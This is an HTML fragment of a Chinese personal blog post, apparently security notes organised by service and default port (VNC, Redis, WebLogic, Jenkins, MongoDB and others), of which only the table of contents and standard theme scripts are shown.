class="toc-text">SysBase：4100、4200、5000</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#VNC%EF%BC%9A5900%E3%80%815901%E3%80%815902"><span class="toc-number">34.</span> <span class="toc-text">VNC：5900、5901、5902</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PostgreSQL%EF%BC%9A5432"><span class="toc-number">35.</span> <span class="toc-text">PostgreSQL：5432</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pcanywhere%EF%BC%9A5632"><span class="toc-number">36.</span> <span class="toc-text">Pcanywhere：5632</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Spark%EF%BC%9A6066%E3%80%817077%E3%80%818081%E3%80%818082"><span class="toc-number">37.</span> <span class="toc-text">Spark：6066、7077、8081、8082</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%EF%BC%9A6379"><span class="toc-number">38.</span> <span class="toc-text">Redis：6379</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WebLogic%EF%BC%9A7001%E3%80%817002"><span class="toc-number">39.</span> <span class="toc-text">WebLogic：7001、7002</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cloudera-Manager%EF%BC%9A7180%E3%80%817183"><span class="toc-number">40.</span> <span class="toc-text">Cloudera Manager：7180、7183</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Resin%EF%BC%9A8080"><span class="toc-number">41.</span> <span class="toc-text">Resin：8080</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat%EF%BC%9A8080"><span class="toc-number">42.</span> <span class="toc-text">Tomcat：8080</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Axis2%EF%BC%9A8080"><span class="toc-number">43.</span> <span class="toc-text">Axis2：8080</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Jetty%EF%BC%9A8080"><span class="toc-number">44.</span> <span class="toc-text">Jetty：8080</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Jenkins%EF%BC%9A8080%E3%80%818089"><span class="toc-number">45.</span> <span class="toc-text">Jenkins：8080、8089</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Jboss%EF%BC%9A8080%E3%80%819990"><span class="toc-number">46.</span> <span class="toc-text">Jboss：8080、9990</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#InfluxDB%EF%BC%9A8086"><span class="toc-number">47.</span> <span class="toc-text">InfluxDB：8086</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache-Activemq%EF%BC%9A8161%E3%80%8161616"><span class="toc-number">48.</span> <span class="toc-text">Apache Activemq：8161、61616</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sun-AnswerBook2%EF%BC%9A8888"><span class="toc-number">49.</span> <span class="toc-text">Sun AnswerBook2：8888</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Websphere%EF%BC%9A9090%E3%80%819091"><span class="toc-number">50.</span> <span class="toc-text">Websphere：9090、9091</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Elasticsearch%EF%BC%9A9200%E3%80%819300"><span class="toc-number">51.</span> <span class="toc-text">Elasticsearch：9200、9300</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Zabbix%EF%BC%9A10050%E3%80%8110051"><span class="toc-number">52.</span> <span class="toc-text">Zabbix：10050、10051</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#memcache%EF%BC%9A11211"><span class="toc-number">53.</span> <span class="toc-text">memcache：11211</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MongoDB%EF%BC%9A27017%E3%80%8128017"><span class="toc-number">54.</span> <span class="toc-text">MongoDB：27017、28017</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hadoop%EF%BC%9Amore"><span class="toc-number">55.</span> <span class="toc-text">Hadoop：more</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 <i style="color:#FF6A6A;animation: announ_animation 0.8s linear infinite;" class="fa fa-heartbeat"></i> V3teran</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script data-pjax src="/js/lalala.js"></script><script src="/live2d-widget/autoload.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="true" data-text="爱国,和谐,友善,富强,敬业,自由,平等,民主" data-fontsize="16px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
